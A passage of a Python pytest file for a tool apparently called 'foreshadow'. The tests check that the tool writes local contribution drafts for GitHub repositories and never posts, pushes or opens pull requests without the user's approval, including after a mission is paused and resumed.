        assert reason in text
    assert m.strategy.allows_direct_pr is False
    empty = write_mission_doc(tmp_path, m).read_text(encoding="utf-8")
    assert "README 安装命令" not in empty
    assert "这是 Python 仓库。" not in empty


def test_reproduction_writes_local_doc_not_pr_draft(tmp_path):
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    assert m.strategy.path == "REPRODUCTION"
    assert write_discussion_draft(tmp_path, m) is None
    assert write_benchmark_doc(tmp_path, m) is None
    path = write_reproduction_doc(
        tmp_path,
        m,
        cited={
            "number": 73,
            "title": "crash on empty batch",
            "body": "repro: pass []",
        },
    )
    assert path is not None
    assert path.name == "REPRODUCTION.md"
    assert write_pr_draft(tmp_path, m) is None
    assert not (tmp_path / "PR_DRAFT.md").exists()
    text = path.read_text(encoding="utf-8")
    _assert_local_only(text)
    assert "#73" in text
    assert "crash on empty batch" in text
    assert "repro: pass []" in text


def test_reproduction_unknown_without_cited_or_help_titles(tmp_path):
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(bug_n=3, issue_sample_n=6),
        stars=40,
        age_days=30,
        contributors=4,
    )
    assert m.strategy.path == "REPRODUCTION"
    path = write_reproduction_doc(tmp_path, m)
    assert path is not None
    text = path.read_text(encoding="utf-8")
    _assert_local_only(text)
    assert "UNKNOWN" in text
    assert re.search(r"#\d+", text) is None


def test_reproduction_cites_help_title_without_fetch(tmp_path):
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    path = write_reproduction_doc(tmp_path, m)
    text = path.read_text(encoding="utf-8")
    assert "#73" in text
    _assert_local_only(text)


def test_discussion_writes_local_draft(tmp_path):
    m = build_mission(
        "acme/toy",
        feat=FeaturesBlob(),
        stars=2,
        age_days=2,
        contributors=1,
        pushed_age_days=0,
    )
    assert m.strategy.path == "DISCUSSION"
    assert write_reproduction_doc(tmp_path, m) is None
    assert write_benchmark_doc(tmp_path, m) is None
    path = write_discussion_draft(tmp_path, m)
    assert path is not None
    assert path.name == "DISCUSSION_DRAFT.md"
    assert write_pr_draft(tmp_path, m) is None
    assert not (tmp_path / "PR_DRAFT.md").exists()
    _assert_local_only(path.read_text(encoding="utf-8"))


def test_benchmark_writes_local_doc(tmp_path):
    m = build_mission(
        "acme/demo",
        feat=FeaturesBlob(
            screenshot_only=True,
            tree_kind="has_source",
            issue_sample_n=4,
            talk_n=2,
        ),
        stars=40,
        age_days=30,
        contributors=4,
        pushed_age_days=1,
        unique_issue_authors=3,
    )
    assert m.strategy.path == "BENCHMARK"
    path = write_benchmark_doc(
        tmp_path,
        m,
        inspect={
            "install_hint": "uv sync",
            "readme_headings": ["Quick Start", "Benchmark"],
        },
    )
    assert path is not None
    assert path.name == "BENCHMARK.md"
    text = path.read_text(encoding="utf-8")
    _assert_local_only(text)
    assert "uv sync" in text
    assert "Quick Start" in text
    assert "Benchmark" in text
    assert write_pr_draft(tmp_path, m) is None


def test_setup_writes_path_specific_local_drafts(tmp_home):
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]

    def persist_and_setup(full_name: str, feat: FeaturesBlob, **kwargs):
        m = build_mission(full_name, feat=feat, **kwargs)
        dest = prepare_local_dir(tmp_home, full_name)
        m.local_path = str(dest)
        mid = persist_mission(conn, m, user_id=uid, repo_id=None)
        out = setup_local_environment(
            conn, mid, uid, tmp_home, runner=_noop_clone_runner("# toy\n## Install\n")
        )
        return dest, out, m

    repro_dest, repro_out, repro = persist_and_setup(
        "acme/repro",
        FeaturesBlob(bug_n=3, issue_sample_n=6),
        stars=40,
        age_days=30,
        contributors=4,
    )
    assert repro.strategy.path == "REPRODUCTION"
    assert (repro_dest / "REPRODUCTION.md").is_file()
    assert not (repro_dest / "PR_DRAFT.md").exists()
    assert not (repro_dest / "DISCUSSION_DRAFT.md").exists()
    assert not (repro_dest / "BENCHMARK.md").exists()
    _assert_local_only((repro_dest / "REPRODUCTION.md").read_text(encoding="utf-8"))
    assert repro_out["mission"].get("reproduction_path")
    assert repro_out["mission"].get("discussion_draft_path") is None
    assert repro_out["mission"].get("benchmark_path") is None
    assert "open a pr" not in (repro_dest / "FORESHADOW.md").read_text(encoding="utf-8").lower()

    talk_dest, talk_out, talk = persist_and_setup(
        "acme/talk",
        FeaturesBlob(),
        stars=2,
        age_days=2,
        contributors=1,
        pushed_age_days=0,
    )
    assert talk.strategy.path == "DISCUSSION"
    assert (talk_dest / "DISCUSSION_DRAFT.md").is_file()
    assert not (talk_dest / "PR_DRAFT.md").exists()
    _assert_local_only((talk_dest / "DISCUSSION_DRAFT.md").read_text(encoding="utf-8"))
    assert talk_out["mission"].get("discussion_draft_path")
    assert talk_out["mission"].get("reproduction_path") is None

    bench_dest, bench_out, bench = persist_and_setup(
        "acme/bench",
        FeaturesBlob(
            screenshot_only=True,
            tree_kind="has_source",
            issue_sample_n=4,
            talk_n=2,
        ),
        stars=40,
        age_days=30,
        contributors=4,
        pushed_age_days=1,
        unique_issue_authors=3,
    )
    assert bench.strategy.path == "BENCHMARK"
    assert (bench_dest / "BENCHMARK.md").is_file()
    assert not (bench_dest / "PR_DRAFT.md").exists()
    _assert_local_only((bench_dest / "BENCHMARK.md").read_text(encoding="utf-8"))
    assert bench_out["mission"].get("benchmark_path")
    assert bench_out["mission"].get("reproduction_path") is None
    for md in bench_dest.glob("*.md"):
        assert "open a pr" not in md.read_text(encoding="utf-8").lower()


def test_board_js_clone_only_after_start_enter():
    from foreshadow.board.webapp import render_app_html

    html = render_app_html()
    start_js = html[
        html.index("async function startEnter") : html.index("async function setupLocal")
    ]
    open_js = html[
        html.index("async function openExisting") : html.index("async function markEvent")
    ]
    assert 'api("/api/mission"' in start_js
    assert "/api/mission/setup" not in start_js
    assert "await setupLocal" in start_js
    assert "setupLocal" not in open_js
    assert "/api/mission/setup" not in open_js
    assert 'api("/api/missions"' in open_js


def test_entry_mission_cannot_post_to_github(tmp_home, monkeypatch):
    """HITL: Board enter, CLI enter, clone, drafts — no GitHub writes."""
    from typer.testing import CliRunner

    from foreshadow.board.server import BoardHandler
    from foreshadow.board.webapp import render_app_html
    from foreshadow.cli import app, enter
    from foreshadow.mission import _load_cited_issue, create_local_branch

    html = render_app_html()
    start_js = html[
        html.index("async function startEnter") : html.index("async function setupLocal")
    ]
    setup_js = html[
        html.index("async function setupLocal") : html.index("async function loadMissions")
    ]
    remote_js = html[
        html.index("async function refuseRemote") : html.index("async function saveReview")
    ]
    existing_js = html[
        html.index("async function openExisting") : html.index("async function markEvent")
    ]
    assert 'api("/api/mission"' in start_js
    assert "/api/mission/setup" not in start_js
    assert "await setupLocal" in start_js
    assert "setupLocal" not in existing_js
    assert "/api/mission/setup" not in existing_js
    assert 'api("/api/missions"' in existing_js
    assert 'api("/api/mission/setup"' in setup_js
    assert 'api("/api/mission/remote"' in remote_js
    assert '"create_pr"' in remote_js
    assert "api.github.com" not in html

    post_src = inspect.getsource(BoardHandler.do_POST)
    mission_handler = post_src[
        post_src.index('path == "/api/mission":') : post_src.index(
            'path == "/api/mission/setup":'
        )
    ]
    setup_handler = post_src[
        post_src.index('path == "/api/mission/setup":') : post_src.index(
            'path == "/api/mission/event":'
        )
    ]
    assert "create_for_user" in mission_handler
    assert "clone_public_repo" not in mission_handler
    assert "setup_local_environment" not in mission_handler
    assert "setup_local_environment" in setup_handler
    remote_src = post_src[post_src.index("/api/mission/remote") :]
    assert "refuse_remote_action" in remote_src
    assert "GitHubClient" not in remote_src
    assert "subprocess" not in remote_src
    assert "httpx" not in remote_src
    branch_src = inspect.getsource(create_local_branch)
    assert '"-B"' not in branch_src
    assert "'-B'" not in branch_src
    assert 'git("push"' not in branch_src
    assert 'git("commit"' not in branch_src

    clone_src = inspect.getsource(clone_public_repo)
    assert '["git", "clone", "--depth", "1", "--", url, str(clone_dir)]' in clone_src
    for fn in (
        write_issue_draft,
        write_pr_draft,
        write_reproduction_doc,
        write_benchmark_doc,
        write_discussion_draft,
        enter,
        _load_cited_issue,
    ):
        src = inspect.getsource(fn)
        assert "GitHubClient" not in src or fn is _load_cited_issue
        assert "request(\"POST\"" not in src
        assert "request('POST'" not in src
        assert "graphql" not in src.lower()
        assert "mutation" not in src.lower()

    monkeypatch.setenv("FORESHADOW_SKIP_CLONE", "1")
    monkeypatch.setenv("GITHUB_TOKEN", "x")

    def boom(*_a, **_k):
        raise AssertionError("git must not run when FORESHADOW_SKIP_CLONE=1")

    monkeypatch.setattr("foreshadow.mission.subprocess.run", boom)

    skipped = clone_public_repo("acme/toy", tmp_home)
    assert skipped["ok"] is False
    assert skipped["status"] == "skipped"
    assert skipped["path"] is None

    class BoomClient:
        def __init__(self, *_a, **_k):
            raise AssertionError("GitHubClient must not be used when clone is skipped")

    monkeypatch.setattr("foreshadow.github.client.GitHubClient", BoomClient)
    entered = CliRunner().invoke(app, ["enter", "acme/toy"])
    assert entered.exit_code == 0, entered.output
    dest = tmp_home / "work" / "acme__toy"
    assert (dest / "ISSUE_DRAFT.md").is_file()
    draft = (dest / "ISSUE_DRAFT.md").read_text(encoding="utf-8")
    assert "等待你的确认" in draft
    assert "不会自动 post" in draft
    if (dest / "PR_DRAFT.md").is_file():
        pr = (dest / "PR_DRAFT.md").read_text(encoding="utf-8")
        assert "不会 `create_pr`" in pr or "不会 create_pr" in pr
        assert "未发送" in pr
    for action in REMOTE_ACTIONS:
        blocked = refuse_remote_action(action)
        assert blocked["blocked"] is True
        assert blocked["ok"] is False

    monkeypatch.delenv("FORESHADOW_SKIP_CLONE")
    calls: list[tuple[str, str]] = []

    class RecordingClient:
        def __init__(self, *_a, **_k):
            pass

        def get(self, path, params=None):
            calls.append(("GET", str(path)))
            return SimpleNamespace(
                status_code=200,
                json=lambda: {"number": 73, "title": "crash", "body": "repro"},
            )

        def request(self, method, url, **_k):
            calls.append((str(method).upper(), str(url)))
            if str(method).upper() not in {"GET", "HEAD"}:
                raise AssertionError(f"GitHub write {method} {url}")
            return SimpleNamespace(status_code=200, json=dict)

        def graphql(self, document, variables, **_k):
            calls.append(("GRAPHQL", str(document)[:80]))
            raise AssertionError("GraphQL is not allowed on the enter path")

        def close(self):
            pass

    monkeypatch.setattr("foreshadow.github.client.GitHubClient", RecordingClient)
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/bug",
        feat=FeaturesBlob(
            bug_n=3,
            issue_sample_n=6,
            help_issue_titles=["#73 crash on empty batch"],
        ),
        stars=40,
        age_days=30,
        contributors=4,
    )
    work = prepare_local_dir(tmp_home, "acme/bug")
    m.local_path = str(work)
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)

    def runner(cmd, **_k):
        argv = list(cmd)
        assert "push" not in argv
        assert "-B" not in argv
        assert "commit" not in argv
        if "clone" in argv:
            assert argv[:4] == ["git", "clone", "--depth", "1"]
            clone_dest = Path(argv[-1])
            clone_dest.mkdir(parents=True)
            (clone_dest / ".git").mkdir()
            (clone_dest / "README.md").write_text("# bug\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    out = setup_local_environment(conn, mid, uid, tmp_home, runner=runner)
    assert out["clone"]["ok"] is True
    assert out["mission"]["status"] != "SUBMITTED"
    assert calls, "cited issue GET should run when clone is not skipped"
    assert all(method in {"GET", "HEAD"} for method, _path in calls)
    assert any("issues/73" in path for _method, path in calls)
    assert (work / "ISSUE_DRAFT.md").is_file()
    assert out["mission"]["needs_user_approval"] is True
    assert "api.github.com" not in inspect.getsource(write_issue_draft)
    assert "api.github.com" not in inspect.getsource(write_pr_draft)
    assert "api.github.com" not in inspect.getsource(write_reproduction_doc)
    assert "api.github.com" not in inspect.getsource(write_benchmark_doc)
    assert "api.github.com" not in inspect.getsource(write_discussion_draft)


def test_pause_then_resume_stays_local(tmp_home):
    from foreshadow.mission import (
        patch_mission_plan,
        persist_mission,
        record_user_event,
        transition,
    )

    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2
    )
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    transition(conn, mid, uid, "LOCAL_SETUP")
    paused = record_user_event(conn, user_id=uid, mission_id=mid, event="paused")
    assert paused["status"] == "PAUSED"
    assert paused["status_zh"] == "已暂停"
    assert paused["next_step_zh"] == "可以继续任务；暂停不会向 GitHub 发请求"
    assert paused["status"] != "SUBMITTED"
    resumed = record_user_event(conn, user_id=uid, mission_id=mid, event="resumed")
    assert resumed["status"] == "LOCAL_SETUP"
    assert resumed["status"] != "SUBMITTED"
    with pytest.raises(ValueError, match="cannot"):
        transition(conn, mid, uid, "SUBMITTED")

    waiting = build_mission(
        "acme/wait", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2
    )
    wid = persist_mission(conn, waiting, user_id=uid, repo_id=None)
    transition(conn, wid, uid, "LOCAL_SETUP")
    transition(conn, wid, uid, "WAITING_USER_APPROVAL")
    patch_mission_plan(conn, wid, uid, {"clone": {"ok": True, "status": "exists"}})
    paused_ok = record_user_event(conn, user_id=uid, mission_id=wid, event="paused")
    assert paused_ok["status"] == "PAUSED"
    after = record_user_event(conn, user_id=uid, mission_id=wid, event="resumed")
    assert after["status"] == "WAITING_USER_APPROVAL"
    assert after["status"] != "SUBMITTED"


def test_cannot_resume_to_submitted(tmp_home):
    from foreshadow.mission import (
        ALLOWED,
        persist_mission,
        record_user_event,
        transition,
    )

    assert "SUBMITTED" not in ALLOWED["PAUSED"]
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2
    )
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    transition(conn, mid, uid, "LOCAL_SETUP")
    paused = record_user_event(conn, user_id=uid, mission_id=mid, event="paused")
    assert paused["status"] == "PAUSED"
    with pytest.raises(ValueError, match="cannot"):
        transition(conn, mid, uid, "SUBMITTED")
    plan = record_user_event(conn, user_id=uid, mission_id=mid, event="resumed")
    assert plan["status"] != "SUBMITTED"
    assert plan["status"] == "LOCAL_SETUP"


def test_paused_event_does_not_call_github(tmp_home, monkeypatch):
    from foreshadow.mission import persist_mission, record_user_event, transition

    class BoomClient:
        def __init__(self, *_a, **_k):
            raise AssertionError("paused must not call GitHub")

        def get(self, *_a, **_k):
            raise AssertionError("paused must not call GitHub")

        def request(self, *_a, **_k):
            raise AssertionError("paused must not call GitHub")

        def graphql(self, *_a, **_k):
            raise AssertionError("paused must not call GitHub")

    monkeypatch.setattr("foreshadow.github.client.GitHubClient", BoomClient)
    src = inspect.getsource(record_user_event)
    assert "GitHubClient" not in src
    assert "api.github.com" not in src
    assert "request(\"POST\"" not in src
    assert "graphql" not in src.lower()
    conn = connect(tmp_home / "foreshadow.sqlite3")
    migrate(conn)
    uid = conn.execute("SELECT id FROM users WHERE is_local=1").fetchone()[0]
    m = build_mission(
        "acme/toy", feat=FeaturesBlob(gap_docs=1), stars=12, age_days=20, contributors=2
    )
    mid = persist_mission(conn, m, user_id=uid, repo_id=None)
    transition(conn, mid, uid, "LOCAL_SETUP")
    plan = record_user_event(conn, user_id=uid, mission_id=mid, event="paused")
    assert plan["status"] == "PAUSED"
    resumed = record_user_event(conn, user_id=uid, mission_id=mid, event="resumed")
    assert resumed["status"] != "SUBMITTED"

